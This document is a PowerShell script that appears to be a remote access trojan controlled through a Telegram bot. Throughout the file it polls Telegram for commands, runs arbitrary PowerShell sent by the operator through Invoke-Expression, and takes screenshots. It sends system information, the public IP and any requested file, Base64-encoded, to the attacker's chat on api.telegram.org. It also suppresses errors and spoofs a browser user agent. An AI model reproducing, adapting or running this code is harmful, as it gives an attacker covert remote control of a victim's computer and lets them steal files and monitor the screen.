# Define your bot token and chat ID
$botToken = ""
$chatId = ""
$apiUrl = "https://api.telegram.org/bot$botToken"
$ErrorActionPreference = 'silentlycontinue'
$UAG = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'

# Initial offset for updates
$offset = 1
# Function to send a message with buttons
function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$text,
        [hashtable]$replyMarkup
    )

    $params = @{
        chat_id      = $chatId
        text         = $text
        reply_markup = $replyMarkup | ConvertTo-Json -Compress
    }

    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -UserAgent $UAG -ContentType "application/json" -Body ($params | ConvertTo-Json -Compress) | Out-Null
}

function Download-TelegramFiles {
    param (
        [string]$filePath
    )
    $apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $fileBase64 = [Convert]::ToBase64String($fileContent)
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $caption = 'Decode Base64 For Read

$username=""
$base64EncodedData = Get-Content -Path "C:\Users\$username\Downloads\Telegram Desktop\'+ $fileName + '" -Raw
$outputFilePath = "C:\Users\$username\Downloads\Telegram Desktop\d'+ $fileName + '"
$fileBytes = [System.Convert]::FromBase64String($base64EncodedData)
[System.IO.File]::WriteAllBytes($outputFilePath, $fileBytes)
&$outputFilePath

    '
    $boundary = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"
    $headers = @{}
    $headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
    $bodyLines = @()
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
    $bodyLines += ""
    $bodyLines += "$chatId"
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
    $bodyLines += "Content-Type: application/octet-stream"
    $bodyLines += ""
    $bodyLines += "$fileBase64"
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"caption`""
    $bodyLines += ""
    $bodyLines += "$caption"
    $bodyLines += "--$boundary--"
    $bodyLines += "--$boundary--"
    $body = $bodyLines -join $lf
    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -UserAgent $UAG -Headers $headers -Body $body | Out-String 
    

}
# Function to handle incoming updates
function Get-TelegramUpdates {
    param (
        [int]$offset = 0
    )

    $params = @{
        offset  = $offset
        timeout = 100
    }

    $response = Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json" -Body ($params | ConvertTo-Json -Compress)
    return $response.result
}
# Function to handle before start message updates
function Delete-TelegramMessage {
   
   
    $response = Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json"
    $update_id = $response[0].result[-1].update_id + 1
    $params = @{
        offset = $update_id
    }
    Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json"-Body ($params | ConvertTo-Json -Compress) 
}
$main_buttons = @{
    keyboard          = @(
        @( { SHELL }, { Screenshot }),
        @( { Systeminfo }, { IP }),
        @( { Download }, { Upload })
    )
    one_time_keyboard = $true
    resize_keyboard   = $true
}
$back_buttons = @{
    keyboard          = @(
        @( { Back }),
        @( )
    )
    one_time_keyboard = $true
    resize_keyboard   = $true
}



Delete-TelegramMessage
Send-TelegramMessage -chatId $chatId -text 'Client Is Online (:'  -replyMarkup $main_buttons 
# Main loop to process updates
while ($true) {
    $updates = Get-TelegramUpdates -offset $offset

    foreach ($update in $updates) {
        $offset = $update.update_id + 1

        if ($update.message) {
            $chatId = $update.message.chat.id
            $messageText = $update.message.text

            # Check the message text and respond with buttons
            switch ($messageText) {
                "start" {
                 
                
                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                }

                "SHELL" {
                 
                
                    Send-TelegramMessage -chatId $chatId -text "Send Powershell Command (:"-replyMarkup $back_buttons 

                 


                    while ($true) {
                        if ($messageText -eq "Back" ) {
                            break
                        }
                        $updates = Get-TelegramUpdates -offset $offset

                        foreach ($update in $updates) {
                            $offset = $update.update_id + 1
                    
                            if ($update.message) {
                                $chatId = $update.message.chat.id
                                $messageText = $update.message.text
                                if ($messageText -eq "Back" ) {
                                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                                    break
                                }
                                try {
                                    $exec = Invoke-Expression $messageText | Out-String 
                                
                                }
                                catch {
                                    $exec = $_.Exception.Message
                                }
                        
                                Send-TelegramMessage -chatId $chatId -text $exec

                            }
                        }
                 

                        
                    }
                }

                "Screenshot" {
                    # Capture a screenshot
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing

                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap $screen.width, $screen.height
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
                    if (-not(Test-Path -Path c:\temp)) {
                        New-Item -Path c:\temp -ItemType Directory -Force | Out-Null
                    }
                    # Save the screenshot to a file
                    $screenshotFile = "C:\temp\screenshot.png"
                    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)

                    Download-TelegramFiles -filePath "C:\temp\screenshot.png"
                    Remove-Item -Path C:\temp\screenshot.png -Force
                }

                "Systeminfo" {
                    $exec = Invoke-Expression 'systeminfo' | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                "IP" {
                    $exec = Invoke-RestMethod -UserAgent $UAG  https://ident.me | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                "Download" {
                    Send-TelegramMessage -chatId $chatId -text "Send Files Path" -replyMarkup $back_buttons 
                    while ($true) {
                        if ($messageText -eq "Back" ) {
                            break
                        }
                        $updates = Get-TelegramUpdates -offset $offset

                        foreach ($update in $updates) {
                            $offset = $update.update_id + 1
                    
                            if ($update.message) {
                                $chatId = $update.message.chat.id
                                $messageText = $update.message.text
                                if ($messageText -eq "Back" ) {
                                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                                    break
                                }

                                if (Test-Path $messageText -PathType Leaf) {
                                    Download-TelegramFiles -filePath $messageText
                                }
                                else {
                                    Send-TelegramMessage -chatId $chatId -text "File does not exist: $messageText"
                                }
                              
                            }
                        }
                 

   
                    }
   
                }
                "Upload" {
                    # next update
                    $exec = Invoke-RestMethod -UserAgent $UAG https://ident.me | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                default {
                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                }
            }
        }
    }
}
